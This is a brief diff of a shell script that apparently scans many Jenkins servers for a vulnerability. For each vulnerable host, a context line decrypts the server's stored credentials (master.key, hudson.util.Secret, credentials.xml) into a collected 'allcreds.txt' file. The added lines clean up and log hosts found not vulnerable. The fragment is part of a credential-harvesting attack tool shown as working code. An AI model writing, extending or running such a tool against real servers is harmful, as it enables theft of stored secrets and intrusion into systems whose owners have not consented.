@@ -56,4 +56,6 @@ _EOM_
 	ruby ../../decrypt_jenkins.rb master.key hudson.util.Secret credentials.xml >> ../../allcreds.txt
 else
 	echo $host is not vulnerable. Continue on.
+	rm -rf jenkins_data/$host
+	echo $host >> ../../not-vulnerable.txt
 fi
